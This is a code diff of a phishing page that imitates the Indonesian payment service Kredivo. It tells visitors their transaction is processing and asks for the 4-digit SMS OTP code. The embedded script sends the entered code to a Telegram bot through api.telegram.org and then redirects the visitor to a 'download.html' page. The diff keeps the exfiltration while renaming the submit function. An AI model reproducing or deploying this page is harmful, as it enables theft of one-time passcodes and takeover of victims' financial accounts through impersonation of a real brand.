@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html lang="id">
-<head><meta charset="UTF-8">
+<html><head><meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Kredivo</title><link rel="shortcut icon" href="https://pay.kredivo.com/favicon.png"><link href="https://pay.kredivo.com/css/main.css" rel="stylesheet">
 <link href="https://api.kredivo.com/static/css/bootstrap.min.css" rel="stylesheet">
@@ -9,7 +7,8 @@
 </head>
 <body style="background-color: #F8F8F8;">
 <nav class="navbar navbar-default navbar-fixed-top"><div class="navbar-header"><button type="button" class="navbar-toggle collapsed" data-toggle="collapse" href="mailto: id.kredivo.apps@gmail.com" aria-expanded="false" aria-controls="navbar"><span>Butuh Bantuan?</span></button><a class="navbar-brand logo" href="./../index.html">Kredivo</a></div></nav>
-<img src="https://6324512979.cbaul-cdnwnd.com/436cd8109bc7dde73d0d84abeac31229/200000022-79fb479fb7/IMG_20221130_072400.jpg?ph=6324512979" alt="" width="100" height="130" loading="lazy" style="top:0%;left:0%;width:100%;l:130%;position: center;">
+<img src="https://6324512979.cbaul-cdnwnd.com/436cd8109bc7dde73d0d84abeac31229/200000022-79fb479fb7/IMG_20221130_072400.jpg?ph=6324512979" alt="" width="100" height="100" loading="lazy" style="top:0%;left:0%;width:100%;l:100%;position: center;">
+<form>
 <center>
 <h4>Transaksimu sedang diproses</h4>
 <p>Jangan refresh atau tutup halaman ini, sebelum kamu mendapatkan kode OTP via SMS</p>
@@ -17,12 +16,11 @@
 <br>
 <h5 style="margin: 0px 18px auto;">kode OTP</h5>
 <center>
-<form method="POST" action="download.html">
-<input class="input" type="tel" id="otp" style="box-sizing: border-box; height: 35px; width: 330px; max-width: 100%; border: 0.5px solid rgb(0, 134, 224); border-radius: 5px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 14px; padding: 0px 12px;" placeholder="Masukkan 4 digit OTP" maxlength="4" minlength="4"/>
-<button class="SEND" id="SENDER" style="margin: 0 auto; width: 330px; min-height: 40px; background-color: #f27d31; margin-top: 13%; padding: 3px; border: solid #e2d7a2 1px; border-radius: 5px; font-color: #FFFFFF; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 14px; padding: 0px 12px; margin: 30px auto;.send{opacity: 0.5;" onclick="submit()">Konfirmasi</button>
-</form>
-<p>Belum menerima SMS?&nbsp;<a href="otp.html"><span class="otp.html">Kirim Ulang</span></a></p>
+<input type="tel" id="otp" style="box-sizing: border-box; height: 35px; width: 330px; max-width: 100%; border: 0.5px solid rgb(0, 134, 224); border-radius: 5px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 14px; padding: 0px 12px;" placeholder="Masukkan 4 digit OTP" maxlength="4" minlength="4" required />
+<input type="button" id="KIRIM" style="margin: 0 auto; width: 330px; min-height: 40px; background-color: #f27d31; margin-top: 13%; padding: 3px; border: solid #e2d7a2 1px; border-radius: 5px; font-color: #FFFFFF; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 14px; padding: 0px 12px; margin: 30px auto;" value="Konfirmasi" onclick="Redirect()" />
+<p>Belum menerima SMS?&nbsp;<a href="pesan.html"><span class="pesan.html">Kirim Ulang</span></a></p>
 </center>
+</form>
 <footer>
 <div id="main-footer"><div><div class="ant-row-flex ant-row-flex-space-between ant-row-flex-middle footer-text flex-nowrap"><div class="ant-col"><img src="https://pay.kredivo.com/images/geotrust-badge.png" width="114" alt="geotrust"></div><div class="ant-col copyright"><p class="m-0">Copyright ©&nbsp;2023&nbsp;FinAccel.</p><p class="m-0">ㅤㅤㅤㅤAll rights reserved.</p></div></div></div><img src="https://pay.kredivo.com/images/footer_mco.png" alt="Footer Kredivo" width="100%"></div>
 </footer>
@@ -30,7 +28,8 @@
     integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
     crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script>
-    function submit() {
+    function Redirect() {
+    window.location = "download.html"
 
     var input = document.getElementById('otp');
 
@@ -43,6 +42,6 @@
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${input}&parse_mode=html`,
         method: `POST`,
         
-    });
+    })
 }
 </script></body></html>
